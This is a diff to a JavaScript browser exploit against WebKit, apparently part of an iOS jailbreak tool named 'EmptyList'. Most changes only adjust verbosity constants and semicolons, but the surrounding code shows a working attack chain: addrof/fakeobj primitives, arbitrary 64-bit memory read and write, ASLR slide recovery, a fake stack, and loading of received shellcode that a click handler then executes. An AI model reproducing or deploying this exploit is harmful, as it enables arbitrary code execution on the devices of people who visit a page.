@@ -130,7 +130,7 @@ var pwn = function() {
     var manager = structure_spray[500];
     var leak_addr = stage1.addrof(manager); //Trigger the infoleak, we can read the address of any structure!
     
-    if(verbosity === VERBOSITY_HIGH) print('leaking from '+hex(leak_addr));
+    if(verbosity === VERBOSITY.HIGH) print('leaking from '+hex(leak_addr));
     
     //function for allocating above
     function alloc_above_manager(expr) {
@@ -180,18 +180,18 @@ var pwn = function() {
     };
     
 
-    print("Using padding: "+(FPO+0x8));
+    if(verbosity === VERBOSITY.VERBOSE) print("Using padding: "+(FPO+0x8));
     
     var fake_addr = stage1.addrof(outer) +FPO+0x8;
     
-    if(verbosity >= VERBOSITY_HIGH) print('fake object is at ' + hex(fake_addr));
+    if(verbosity >= VERBOSITY.HIGH) print('fake object is at ' + hex(fake_addr));
     
     //leak the addresses of our cell
     var unboxed_addr = stage1.addrof(unboxed);
     var boxed_addr = stage1.addrof(boxed);
     var victim_addr = stage1.addrof(victim);
     
-    if(verbosity >= VERBOSITY_HIGH) print('leak ' + hex(leak_addr)
+    if(verbosity >= VERBOSITY.HIGH) print('leak ' + hex(leak_addr)
                                           + '\nunboxed ' + hex(unboxed_addr)
                                           + '\nboxed ' + hex(boxed_addr)
                                           + '\nvictim ' + hex(victim_addr));
@@ -217,63 +217,65 @@ var pwn = function() {
     }
     
     print('Stage (1/2) done.');
-    
-    //Alright, this is where we get full r/w to memory
-    //Thanks to stek29
+
+
     var stage2 = {
         addrof: function(victim) {
-            boxed[0] = victim
-            return f2i(unboxed[0])
+            boxed[0] = victim;
+            return f2i(unboxed[0]);
         },
 
         fakeobj: function(addr) {
-            unboxed[0] = i2f(addr)
-            return boxed[0]
+            unboxed[0] = i2f(addr);
+            return boxed[0];
         },
 
         write64: function(where, what) {
-            set_victim_addr(where)
-            victim_write(this.fakeobj(what))
-            reset_victim_addr()
+            set_victim_addr(where);
+            victim_write(this.fakeobj(what));
+            reset_victim_addr();
         },
 
         read64: function(where) {
-            set_victim_addr(where)
-            var res = this.addrof(victim_read())
-            reset_victim_addr()
-            return res
+            set_victim_addr(where);
+            var res = this.addrof(victim_read());
+            reset_victim_addr();
+            return res;
         },
 
         write_non_zero: function(where, values) {
             for (var i = 0; i < values.length; ++i) {
-                if (values[i] != 0)
-                    this.write64(where + i*8, values[i])
+                if (values[i] != 0) {
+                    this.write64(where + i*8, values[i]);
+                }
             }
         },
 
         test: function() {
-            this.write64(boxed_addr + 0x10, 0xfff) // Overwrite index mask, no biggie
+            this.write64(boxed_addr + 0x10, 0xfff); // Overwrite index mask, no biggie
             if (0xfff != this.read64(boxed_addr + 0x10)) {
-                fail(2)
+                fail(2);
             }
         },
 
         forge: function(values) {
-            for (var i = 0; i < values.length; ++i)
-                unboxed[1 + i] = i2f(values[i])
-            return shared_butterfly + 8
+            for (var i = 0; i < values.length; ++i) {
+                unboxed[1 + i] = i2f(values[i]);
+            }
+            return shared_butterfly + 8;
         },
 
         clear: function() {
-            outer = null
-            holder.fake = null
-            for (var i = 0; i < unboxed_size; ++i)
-                boxed[0] = null
+            outer = null;
+            holder.fake = null;
+            for (var i = 0; i < unboxed_size; ++i) {
+                boxed[0] = null;
+            }
         },
     }
 
 
-    if(verbosity === VERBOSITY_VERBOSE) print("Stage 2 test succeeded, continueing...");
+    if(verbosity === VERBOSITY.VERBOSE) print("Stage 2 test succeeded, continueing...");
     
     var wrapper = document.createElement('div');
     var wrapper_addr = stage2.addrof(wrapper);
@@ -281,7 +283,7 @@ var pwn = function() {
     var vtab_addr = stage2.read64(el_addr);
     
 
-    if(verbosity >= VERBOSITY_HIGH) print("Lets hope our offsets are correct as we will now use them.");
+    if(verbosity >= VERBOSITY.HIGH) print("Lets hope our offsets are correct as we will now use them.");
 
     //now get the ASLR slide
     var slide = stage2.read64(vtab_addr) - _off.vtable;
@@ -312,10 +314,10 @@ var pwn = function() {
     //JIT Hardening stuff
     if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
         // Probably an older phone, should be even easier
-       // fail(3);
+        fail(3);
     }
     
-    if(verbosity === VERBOSITY_VERBOSE) print("Setting up shellcode in memory...");
+    if(verbosity === VERBOSITY.VERBOSE) print("Setting up shellcode in memory...");
 
     //Now set up our shellcode for code execution
     var callback_vector = stage2.read64(callbacks);
@@ -332,7 +334,7 @@ var pwn = function() {
 
     stage2.write64(shellcode_src + 4, dlsym);
               
-    print("Setting up fake stack...");
+    if(verbosity === VERBOSITY.VERBOSE) print("Setting up fake stack...");
     //set up our fake executable stack
     var fake_stack = [
         0,
@@ -363,7 +365,7 @@ var pwn = function() {
           u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32;
     }
     
-    if(verbosity >= VERBOSITY_HIGH) print("Setting up code execution...");
+    if(verbosity >= VERBOSITY.HIGH) print("Setting up code execution...");
 
     //lets set up our code execution of the dylib payload
     stage2.write_non_zero(el_addr, [
@@ -377,8 +379,8 @@ var pwn = function() {
         0,
         buffer_addr + 0x2000, // sp
     ]);
-    if(verbosity >= VERBOSITY_HIGH) print('shellcode is at ' + hex(shellcode_dst));
-    if(verbosity >= VERBOSITY_DEFAULT) print('EmptyList is started, please close all background apps then dismiss this alert.');
+    if(verbosity >= VERBOSITY.HIGH) print('shellcode is at ' + hex(shellcode_dst));
+    if(verbosity >= VERBOSITY.DEFAULT) print('EmptyList is started, please close all background apps then dismiss this alert.');
     wrapper.addEventListener('click', function(){}); //execute the shellcode
 };
 
@@ -410,11 +412,9 @@ var wk113go = function() {
                 if(shellcode_hashes.sha256 !== "a4a3254bc86d5b2030c0637173b927a489b98d1d29fcfcc8232636eec94a2fe8") throw new Error('Shellcode integrity check failed.');
                 if(shellcode_hashes.sha384 !== "78791343c427ddd51c1bc236f77bafc4cfef04796f931d856e6652aadedb5ab54e46fe9b05e98ce7dc982eba9f1c6220") throw new Error('Shellcode integrity check failed.');
                 if(shellcode_hashes.sha512 !== "ef48614b78b42be7bedb79a7aa768eb19ad8fb05cefac2d68c8d74ab6a95d77aa1054d255294b5bf7e9ece648ac916fa8999e79aa93a707732b9850418bd0053") throw new Error('Shellcode integrity check failed.');
-                
                 print("Shellcode sha512sum: "+shellcode_hashes.sha512);
-
                 u8_buffer.set(shellcode_data, 0x4000); //basically the same as what memset() and memcpy would do in c. uint8 is a char array containing our shellcode
-                print('Received '+shellcode_length+ ' bytes of shellcode. Exploit will start now.');
+                if(verbosity === VERBOSITY.HIGH) print('Received '+shellcode_length+ ' bytes of shellcode. Exploit will start now.');
                 pwn();
             } catch(exception) {
                 alert(exception); //We do not want our script to fail, so we catch all exceptions if they occur and continue
